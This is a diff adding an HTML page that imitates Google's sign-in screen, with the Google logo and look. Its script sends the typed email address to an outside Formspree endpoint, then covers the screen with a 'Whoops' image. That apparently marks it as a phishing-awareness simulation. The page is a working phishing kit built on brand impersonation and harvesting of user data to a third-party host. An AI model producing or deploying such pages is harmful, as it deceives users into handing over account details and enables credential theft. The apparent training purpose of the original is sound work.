@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 2em;
+            width: 300px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 75px;
+            margin-bottom: 1em;
+        }
+        .login-container h2 {
+            font-weight: normal;
+            font-size: 1.25em;
+            color: #202124;
+            margin-bottom: 1em;
+        }
+        .input-field {
+            width: 100%;
+            padding: 0.5em;
+            margin-bottom: 1em;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 1em;
+        }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 0.75em;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #1558c7;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 1em;
+            font-size: 0.9em;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        /* Pop-up styles */
+        .popup {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent background */
+            z-index: 1000;
+            overflow: hidden;
+        }
+        .popup img {
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover; /* Ensure image covers the screen */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        <h2>Sign in</h2>
+        <form id="loginForm" action="https://formspree.io/f/mjkboklg" method="POST">
+            <input type="email" name="email" id="email" class="input-field" placeholder="Email or phone" required><br>
+            <button type="submit" class="btn">Next</button>
+        </form>
+        <a href="#" class="forgot-link">Forgot email?</a>
+    </div>
+
+    <!-- The Pop-up -->
+    <div id="popup" class="popup">
+        <img src="" alt="Image" id="popupImage">
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const form = event.target;
+            const formData = new FormData(form);
+
+            // Show the pop-up image immediately
+            const popup = document.getElementById('popup');
+            const popupImage = document.getElementById('popupImage');
+            popupImage.src = 'https://leapfrogmarket.com.au/wp-content/uploads/2023/10/SimulationsPage_Whoops_EN-1024x615.jpg'; // Replace with your image URL
+            popup.style.display = 'block';
+
+            // Use Fetch API to submit the form data to Formspree
+            fetch(form.action, {
+                method: form.method,
+                body: formData
+            })
+            .then(response => response.json())
+            .then(() => {
+                console.log('Form submitted successfully');
+                // Optionally handle post-submission actions here
+            })
+            .catch(error => {
+                console.error('Form submission error:', error);
+            });
+        });
+    </script>
+
+</body>
+</html>
